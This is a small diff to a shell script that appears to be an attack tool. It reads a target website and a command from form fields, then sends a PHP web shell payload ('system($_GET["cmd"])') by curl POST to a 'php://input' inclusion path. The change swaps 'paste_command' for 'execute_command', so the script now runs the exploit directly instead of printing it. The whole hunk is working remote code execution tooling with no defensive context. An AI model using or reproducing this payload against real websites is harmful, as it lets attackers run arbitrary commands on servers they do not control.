@@ -14,4 +14,4 @@ generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"
 WEBSITE=${form_data["website"]}
 CMD=${form_data["cmd"]}
 
-paste_command "curl -s -X POST --data '<?php system(\$_GET["cmd"]); ?>' "${WEBSITE}php://input\&cmd=${CMD}""
+execute_command "curl -s -X POST --data '<?php system(\$_GET["cmd"]); ?>' "${WEBSITE}php://input\&cmd=${CMD}""
